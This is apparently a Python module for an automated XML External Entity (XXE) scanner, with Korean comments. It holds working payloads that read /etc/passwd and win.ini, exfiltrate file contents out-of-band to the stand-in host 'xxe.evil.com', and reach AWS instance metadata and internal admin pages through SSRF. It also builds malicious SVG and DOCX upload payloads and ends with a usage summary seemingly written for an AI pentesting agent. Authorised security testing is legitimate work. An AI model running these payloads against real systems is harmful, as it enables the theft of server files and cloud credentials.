"""
XXE Auto-Scanner — XML External Entity 자동화
=============================================
1. XXE 탐지: Content-Type 변경 + XML 페이로드 삽입
2. In-band XXE: /etc/passwd 직접 읽기
3. Blind XXE: OOB DNS 콜백
4. SVG/DOCX/XLSX 파일 업로드 기반 XXE
5. XXE → SSRF 연계
"""
from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Callable


# ══════════════════════════════════════════════════════════════
# XXE 페이로드
# ══════════════════════════════════════════════════════════════

def gen_xxe_payloads(
    oob_domain: str = "xxe.evil.com",
    target_file: str = "/etc/passwd",
) -> dict[str, str]:
    """XXE 페이로드 목록 생성"""
    return {
        "basic_file_read": f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file://{target_file}">]>
<root>&xxe;</root>""",

        "basic_win_file": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<root>&xxe;</root>""",

        "oob_dns": f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY % dtd SYSTEM "http://{oob_domain}/xxe.dtd"> %dtd;]>
<root>&exfil;</root>""",

        "oob_file_exfil": f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file://{target_file}">
  <!ENTITY % dtd SYSTEM "http://{oob_domain}/xxe.dtd">
  %dtd;
]>
<root>&send;</root>""",

        "ssrf_aws": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/">]>
<root>&xxe;</root>""",

        "ssrf_internal": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin/">]>
<root>&xxe;</root>""",

        "parameter_entity": f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % pe SYSTEM "file://{target_file}">
  <!ENTITY % wrapper "<!ENTITY send SYSTEM 'http://{oob_domain}/?x=%pe;'>">
  %wrapper;
]>
<root>&send;</root>""",

        "soap_xxe": f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE soap:Envelope [<!ENTITY xxe SYSTEM "file://{target_file}">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body><data>&xxe;</data></soap:Body>
</soap:Envelope>""",
    }


SVG_XXE_TEMPLATE = """<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image href="data:image/png;base64,&xxe;" />
</svg>"""

DOCX_XXE_TEMPLATE = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE r [<!ENTITY % sp SYSTEM "http://{oob_domain}/xxe.dtd">%sp;]>
<r xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
&exfil;
</r>"""


# ══════════════════════════════════════════════════════════════
# XXE 응답 탐지
# ══════════════════════════════════════════════════════════════

FILE_READ_INDICATORS = [
    r"root:x:0:0",             # /etc/passwd
    r"daemon:x:",
    r"/bin/(?:bash|sh)",
    r"\[fonts\]",              # win.ini
    r"\[extensions\]",
    r"for 16-bit app",
]


def _check_xxe_response(body: str) -> tuple[bool, str]:
    for pat in FILE_READ_INDICATORS:
        if re.search(pat, body):
            return True, f"File content detected: {pat}"
    return False, ""


@dataclass
class XxeFinding:
    payload_type: str
    endpoint: str
    content_type: str
    confirmed: bool
    evidence: str
    file_content: str = ""
    severity: str = "CRITICAL"


@dataclass
class XxeReport:
    target: str
    findings: list[XxeFinding] = field(default_factory=list)
    endpoints_tested: int = 0


class XxeScanner:
    """XXE 자동 스캐너"""

    def __init__(
        self,
        request_fn: Callable[[str, str, dict, str | None], tuple[int, str]],
        log_fn: Callable[[str], None] | None = None,
        oob_domain: str = "",
    ):
        self._req = request_fn
        self.log = log_fn or (lambda s: None)
        self.oob = oob_domain or "xxe.oob.local"

    def scan_endpoint(self, url: str, original_body: str = "") -> list[XxeFinding]:
        """단일 엔드포인트 XXE 스캔"""
        findings: list[XxeFinding] = []
        payloads = gen_xxe_payloads(oob_domain=self.oob)

        # XML Content-Type 변형
        xml_content_types = [
            "application/xml",
            "text/xml",
            "application/xhtml+xml",
        ]

        for ct in xml_content_types:
            for payload_name, payload in payloads.items():
                if "oob" in payload_name and not self.oob:
                    continue

                headers = {
                    "Content-Type": ct,
                    "Accept": "application/xml, text/xml, */*",
                }
                status, body = self._req(url, "POST", headers, payload)

                if status in (200, 500):  # 500도 XXE 응답일 수 있음
                    confirmed, evidence = _check_xxe_response(body)
                    if confirmed or (status == 500 and "java" in body.lower()):
                        f = XxeFinding(
                            payload_type=payload_name,
                            endpoint=url,
                            content_type=ct,
                            confirmed=confirmed,
                            evidence=evidence,
                            file_content=body[:500] if confirmed else "",
                        )
                        findings.append(f)
                        if confirmed:
                            self.log(f"[XXE!] {url} | {payload_name} | {evidence}")
                        break

        return findings

    def detect_xml_endpoints(self, endpoints: list[str], headers: dict) -> list[str]:
        """XML을 처리할 가능성이 있는 엔드포인트 탐지"""
        xml_eps: list[str] = []
        xml_hints = [
            "xml", "soap", "wsdl", "feed", "rss", "atom",
            "sitemap", "upload", "import", "parse",
        ]
        for ep in endpoints:
            if any(h in ep.lower() for h in xml_hints):
                xml_eps.append(ep)
        return xml_eps

    def gen_svg_payload(self) -> bytes:
        """SVG 업로드용 XXE 페이로드"""
        return SVG_XXE_TEMPLATE.encode("utf-8")

    def gen_docx_payload(self) -> str:
        """DOCX XML 파트용 XXE 페이로드"""
        return DOCX_XXE_TEMPLATE.format(oob_domain=self.oob)


XXE_SCANNER_SUMMARY = """
=== XXE AUTO-SCANNER (AI AUTO-SELECT) ===

Trigger: XML input accepted, SOAP endpoint, SVG/DOCX upload, RSS/sitemap feed

from bingo.tools.xxe_scanner import XxeScanner
scanner = XxeScanner(request_fn, oob_domain="<interactsh>")
scanner.scan_endpoint(url, original_body)

SVG upload: scanner.gen_svg_payload() → upload as SVG file
"""
